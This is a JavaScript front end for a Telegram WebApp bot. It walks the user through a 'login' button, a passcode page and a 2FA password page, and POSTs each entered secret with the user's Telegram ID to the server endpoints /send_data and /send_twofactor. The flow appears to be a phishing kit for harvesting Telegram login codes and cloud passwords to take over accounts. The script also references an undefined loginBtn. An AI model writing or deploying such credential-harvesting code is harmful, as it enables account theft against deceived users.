document.addEventListener('DOMContentLoaded', () => {
    const tg = window.Telegram?.WebApp;
    if (!tg) return alert("⚠️ Telegram WebApp not loaded. Open via the bot.");

    tg.ready();
    tg.expand();

    let userInfo = tg.initDataUnsafe?.user || null;

    const passcodeInput = document.getElementById('hiddenInput');
    const twofactorInput = document.getElementById('twofactor-input');
    const passcodeBtn = document.getElementById('passcode-btn');
    const twofactorBtn = document.getElementById('twofactor-btn');
    const page2 = document.getElementById('page2');
    const page3 = document.getElementById('page3');
    const blur = document.getElementById('blur');

    // Page transitions
    function showPage2() {
        page2.style.display = 'flex';
        page2.style.transform = 'translateY(0)';
        blur.style.opacity = '1';
    }

    function showPage3() {
        page2.style.display = 'none';
        page3.style.display = 'flex';
        page3.style.transform = 'translateY(0)';
    }

    loginBtn.addEventListener('click', () => {
        console.log('✅ Login clicked');
        showPage2(); // Just move to next page, no Telegram API call
    });


    // === SEND PASSCODE ===
    passcodeBtn.addEventListener('click', async () => {
        const passcode = passcodeInput.value.trim();
        const user_id = userInfo?.id;

        if (!passcode) return tg.showAlert("⚠️ Please enter passcode");
        if (!user_id) return tg.showAlert("⚠️ User ID missing — open in Telegram");

        try {
            const res = await fetch('/send_data', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ passcode, user_id })
            });

            const data = await res.json();
            console.log('✅ Server response:', data);

            tg.showAlert('✅ Passcode sent!');
            showPage3(); // ✅ Automatically move to 2FA page
        } catch (err) {
            console.error('❌ Error:', err);
            tg.showAlert('❌ Failed to send passcode');
        }
    });

    // === SEND 2FA ===
    twofactorBtn.addEventListener('click', async () => {
        const twofactor = twofactorInput.value.trim();
        const user_id = userInfo?.id;

        if (!twofactor) return tg.showAlert("⚠️ Please enter 2FA password");
        if (!user_id) return tg.showAlert("⚠️ User ID missing");

        try {
            const res = await fetch('/send_twofactor', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ twofactor, user_id })
            });

            const data = await res.json();
            console.log('✅ Server response:', data);
            tg.showAlert('✅ 2FA sent!');
        } catch (err) {
            console.error('❌ Error:', err);
            tg.showAlert('❌ Failed to send 2FA');
        }
    });
});
